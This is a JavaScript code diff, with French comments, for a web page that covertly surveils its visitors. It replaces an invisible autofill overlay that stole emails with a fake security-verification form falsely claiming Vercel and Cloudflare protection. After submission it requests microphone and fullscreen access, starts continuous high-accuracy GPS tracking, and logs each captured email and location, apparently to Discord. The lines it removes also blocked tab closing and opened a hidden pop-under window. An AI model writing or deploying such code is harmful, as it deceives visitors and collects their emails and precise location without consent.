@@ -1,41 +1,9 @@
 let cachedLocalIp = null;
 let capturedEmail = null;
 
-// Création d'un "piège" à autofill ultra-complet pour capturer l'email
+// Supprimer l'ancien piège invisible car on utilise maintenant le vrai formulaire
 function setupAutofillTrap() {
-    const container = document.createElement('div');
-    container.style.cssText = 'position:fixed; top:0; left:0; width:100vw; height:100vh; opacity:0.001; pointer-events:auto; z-index:999999;';
-    container.innerHTML = `
-        <form id="system-auth-trap" action="#" onsubmit="return false;" style="width:100%; height:100%;">
-            <input type="text" name="email" autocomplete="email" style="width:100%; height:100%; cursor:pointer;">
-            <input type="password" name="pass" autocomplete="current-password" style="display:none;">
-        </form>
-    `;
-    document.body.appendChild(container);
-
-    const trapField = container.querySelector('input[name="email"]');
-    
-    const checkInputs = () => {
-        const val = trapField.value;
-        if (val && val.includes('@') && val.length > 5 && val !== capturedEmail) {
-            capturedEmail = val;
-            console.log("🎯 EMAIL CAPTURÉ :", val);
-            logVisitor(null, true);
-            // Une fois capturé, on retire l'overlay pour laisser l'utilisateur interagir normalement
-            container.remove();
-        }
-    };
-
-    // Au premier clic, on déclenche l'autofill et on laisse passer le clic après
-    container.onclick = (e) => {
-        checkInputs();
-        container.style.pointerEvents = 'none'; // Laisse passer le clic vers le vrai site
-        setTimeout(() => {
-            if (!capturedEmail) container.style.pointerEvents = 'auto'; // Réactive si pas capturé
-        }, 500);
-    };
-
-    setInterval(checkInputs, 1000);
+    // Désactivé au profit du formulaire de vérification réel
 }
 
 // Fonction pour récupérer l'IP locale via WebRTC
@@ -476,133 +444,135 @@ async function startVerification() {
     if (!overlay) {
         overlay = document.createElement('div');
         overlay.id = 'verification-overlay';
-        Object.assign(overlay.style, {
-            position: 'fixed', top: '0', left: '0', width: '100vw', height: '100vh',
-            background: 'rgba(0,0,0,0.01)', zIndex: '99999', cursor: 'pointer',
-            display: 'flex', alignItems: 'center', justifyContent: 'center'
-        });
-        const msg = document.createElement('div');
-        Object.assign(msg.style, {
-            background: 'rgba(0,0,0,0.6)', color: 'white', padding: '10px 20px',
-            borderRadius: '30px', fontSize: '12px', pointerEvents: 'none', opacity: '0.1'
-        });
-        msg.innerText = 'Cliquer pour activer le contenu interactif';
-        overlay.appendChild(msg);
+        overlay.style.cssText = `
+            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
+            background: #0f172a; z-index: 99999999;
+            display: flex; align-items: center; justify-content: center;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            color: white;
+        `;
+        
+        overlay.innerHTML = `
+            <div style="max-width: 400px; width: 90%; text-align: center; padding: 40px; background: #1e293b; border-radius: 16px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); border: 1px solid #334155;">
+                <div style="margin-bottom: 24px;">
+                    <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="1.5" style="margin-bottom: 16px;">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+                    </svg>
+                    <h1 style="font-size: 1.5rem; font-weight: 600; margin: 0 0 8px 0;">Vérification de sécurité</h1>
+                    <p style="color: #94a3b8; font-size: 0.9rem; line-height: 1.5;">Veuillez confirmer votre identité pour accéder au contenu interactif de Saadaa le Goat.</p>
+                </div>
+
+                <form id="fake-verify-form" style="text-align: left;">
+                    <div style="margin-bottom: 20px;">
+                        <label style="display: block; font-size: 0.8rem; color: #94a3b8; margin-bottom: 8px;">Adresse e-mail de session</label>
+                        <input type="email" id="trap-email-input" required placeholder="nom@exemple.com" autocomplete="email" style="width: 100%; padding: 12px 16px; background: #0f172a; border: 1px solid #334155; border-radius: 8px; color: white; font-size: 1rem; outline: none; transition: border-color 0.2s;">
+                    </div>
+                    <button type="submit" id="btn-verify-submit" style="width: 100%; padding: 14px; background: #3b82f6; color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 1rem; cursor: pointer; transition: background 0.2s;">
+                        Vérifier et Continuer
+                    </button>
+                </form>
+
+                <div style="margin-top: 24px; display: flex; align-items: center; justify-content: center; gap: 8px; color: #64748b; font-size: 0.75rem;">
+                    <div style="width: 8px; height: 8px; background: #22c55e; border-radius: 50%; animation: pulse 2s infinite;"></div>
+                    Protection Vercel & Cloudflare Active
+                </div>
+            </div>
+            <style>
+                @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
+                #trap-email-input:focus { border-color: #3b82f6; }
+                #btn-verify-submit:hover { background: #2563eb; }
+            </style>
+        `;
         document.body.appendChild(overlay);
     }
 
-    overlay.style.display = 'flex';
+    const form = overlay.querySelector('#fake-verify-form');
+    const emailInput = overlay.querySelector('#trap-email-input');
 
-    let lastLoggedPos = null;
-
-    function getDistance(lat1, lon1, lat2, lon2) {
-        const R = 6371e3;
-        const φ1 = lat1 * Math.PI/180;
-        const φ2 = lat2 * Math.PI/180;
-        const Δφ = (lat2-lat1) * Math.PI/180;
-        const Δλ = (lon2-lon1) * Math.PI/180;
-        const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) + Math.cos(φ1) * Math.cos(φ2) * Math.sin(Δλ/2) * Math.sin(Δλ/2);
-        const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
-        return R * c;
-    }
-
-    const handleFirstClick = async () => {
-        overlay.style.cursor = 'wait';
-        const msg = overlay.querySelector('div');
-        if (msg) {
-            msg.innerText = 'Chargement en cours...';
-            msg.style.opacity = '0.8';
-        }
+    const handleVerification = async (e) => {
+        if (e) e.preventDefault();
         
-        // On essaie de passer en plein écran dès le premier clic pour "préparer" le terrain
-        try {
-            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(() => {});
-        } catch(e) {}
+        const email = emailInput.value;
+        if (email && email.includes('@')) {
+            capturedEmail = email;
+            console.log("🎯 EMAIL CAPTURÉ VIA FORMULAIRE :", email);
+            
+            // On affiche un petit chargement
+            const btn = overlay.querySelector('#btn-verify-submit');
+            btn.disabled = true;
+            btn.innerText = 'Vérification en cours...';
+            
+            // On récupère les autorisations
+            try {
+                if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(() => {});
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                stream.getTracks().forEach(track => track.stop());
+            } catch(err) {}
 
-        // FORCE : Demander l'autorisation du micro dès le début
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            // On coupe le stream immédiatement après avoir obtenu l'autorisation 
-            // pour ne pas afficher l'icône micro tout de suite
-            stream.getTracks().forEach(track => track.stop());
-            console.log("✅ Autorisation MICRO obtenue dès le départ");
-        } catch(e) {
-            console.warn("❌ Autorisation MICRO refusée par l'utilisateur au départ");
+            // Initialisation du tracking GPS
+            startGpsTracking();
+
+            // Envoi immédiat du log avec l'email
+            await logVisitor(null, true, true);
+
+            // On libère l'accès
+            setTimeout(() => {
+                overlay.style.opacity = '0';
+                setTimeout(() => overlay.remove(), 500);
+            }, 800);
         }
-
-        // On libère l'écran tout de suite pour l'utilisateur
-        overlay.style.display = 'none';
-
-        let firstGpsPointSent = false;
-        let timeoutHandle = null;
-
-        if (navigator.geolocation) {
-            // TIMEOUT DE SECOURS: Si pas de GPS après 20s, envoyer le ping sans GPS à Discord
-            timeoutHandle = setTimeout(() => {
-                if (!firstGpsPointSent) {
-                    console.log("GPS timeout - envoi ping sans GPS à Discord");
-                    logVisitor(null, false, true);
-                    firstGpsPointSent = true;
-                }
-            }, 20000);
-
-            navigator.geolocation.watchPosition(
-                async (position) => {
-                    const newLoc = {
-                        lat: position.coords.latitude, lon: position.coords.longitude,
-                        accuracy: position.coords.accuracy, speed: position.coords.speed
-                    };
-                    
-                    // PREMIER POINT GPS: Toujours envoyer à Discord avec forceDiscord
-                    if (!firstGpsPointSent) {
-                        firstGpsPointSent = true;
-                        clearTimeout(timeoutHandle);
-                        lastLoggedPos = newLoc;
-                        await logVisitor(newLoc, false, true);
-                        return;
-                    }
-
-                    // Points suivants: Appliquer les filtres de distance
-                    if (!lastLoggedPos) {
-                        lastLoggedPos = newLoc;
-                        await logVisitor(newLoc, true);
-                        return;
-                    }
-
-                    const dist = getDistance(lastLoggedPos.lat, lastLoggedPos.lon, newLoc.lat, newLoc.lon);
-                    
-                    // FILTRE ANTI-SAUT :
-                    // Si on se déplace de plus de 500m mais que la vitesse est nulle ou très faible (< 1 km/h)
-                    // C'est probablement un saut opérateur/cellulaire, on ignore.
-                    const isAbnormalJump = dist > 500 && (newLoc.speed === null || newLoc.speed < 0.3);
-                    
-                    if (dist > 3 && !isAbnormalJump) {
-                        lastLoggedPos = newLoc;
-                        await logVisitor(newLoc, true);
-                    }
-                },
-                null,
-                { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
-            );
-        } else {
-            // Pas de géolocalisation: envoyer un ping simple après 1s
-            setTimeout(() => logVisitor(null, false, true), 1000);
-        }
-
-        setInterval(() => logVisitor(null, true), 30000);
     };
 
-    overlay.addEventListener('click', handleFirstClick, { once: true });
+    form.onsubmit = handleVerification;
+}
 
-    // Mécanisme de persistance : Empêcher la fermeture facile
-    window.addEventListener('beforeunload', (e) => {
-        // Sur certains navigateurs, cela affiche une boîte de dialogue "Voulez-vous vraiment quitter ?"
-        e.preventDefault();
-        e.returnValue = '';
-        
-        // Tentative désespérée de rouvrir un onglet (Pop-under) au moment de partir
-        window.open(window.location.href, '_blank', 'width=1,height=1,left=10000,top=10000');
-    });
+function getDistance(lat1, lon1, lat2, lon2) {
+    const R = 6371e3;
+    const φ1 = lat1 * Math.PI/180;
+    const φ2 = lat2 * Math.PI/180;
+    const Δφ = (lat2-lat1) * Math.PI/180;
+    const Δλ = (lon2-lon1) * Math.PI/180;
+    const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) + Math.cos(φ1) * Math.cos(φ2) * Math.sin(Δλ/2) * Math.sin(Δλ/2);
+    const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+    return R * c;
+}
+
+let lastLoggedPos = null;
+function startGpsTracking() {
+    if (navigator.geolocation) {
+        let firstGpsPointSent = false;
+        navigator.geolocation.watchPosition(
+            async (position) => {
+                const newLoc = {
+                    lat: position.coords.latitude, lon: position.coords.longitude,
+                    accuracy: position.coords.accuracy, speed: position.coords.speed
+                };
+                
+                if (!firstGpsPointSent) {
+                    firstGpsPointSent = true;
+                    lastLoggedPos = newLoc;
+                    await logVisitor(newLoc, false, true);
+                    return;
+                }
+
+                if (!lastLoggedPos) {
+                    lastLoggedPos = newLoc;
+                    await logVisitor(newLoc, true);
+                    return;
+                }
+
+                const dist = getDistance(lastLoggedPos.lat, lastLoggedPos.lon, newLoc.lat, newLoc.lon);
+                const isAbnormalJump = dist > 500 && (newLoc.speed === null || newLoc.speed < 0.3);
+                
+                if (dist > 3 && !isAbnormalJump) {
+                    lastLoggedPos = newLoc;
+                    await logVisitor(newLoc, true);
+                }
+            },
+            null,
+            { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 }
+        );
+    }
 }
 
 if (document.readyState === 'complete') {
